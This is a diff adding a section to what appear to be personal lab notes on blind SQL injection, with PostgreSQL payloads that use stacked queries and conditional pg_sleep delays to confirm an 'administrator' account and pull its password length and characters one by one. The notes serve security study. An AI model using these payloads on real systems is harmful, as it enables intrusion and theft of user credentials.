@@ -983,12 +983,18 @@ Blind SQL injection with time delays
 The website will sleep about 10 seconds (pg_sleep() is used in postgreSQL)
 TrackingId=YuyEPQKc6y6pS6lN' || pg_sleep(10)--
 __________________________________________________________________________________________________________________________________________________________________
+Blind SQL injection with time delays and information retrieval
+----------------------------------------------------------------
+TrackingId=YuyEPQKc6y6pS6lN'; Select case when (1=1) Then pg_sleep(3) Else pg_sleep(0) End --
 
+(;) is used to terminate the SQL query and start the new SQL query to execute.
 
+vHvNvopdDIu9EmGO'; Select case when (username ='administrator') Then pg_sleep(3) Else pg_sleep(0) End from users--
 
+vHvNvopdDIu9EmGO'; Select case when (username ='administrator' AND length(password)> 100) Then pg_sleep(3) Else pg_sleep(0) End from users--
 
-
-
+vHvNvopdDIu9EmGO'; Select case when (username ='administrator' AND SUBSTR(password,1,1)='a') Then pg_sleep(3) Else pg_sleep(0) End from users--
+__________________________________________________________________________________________________________________________________________________________________
 
 
 
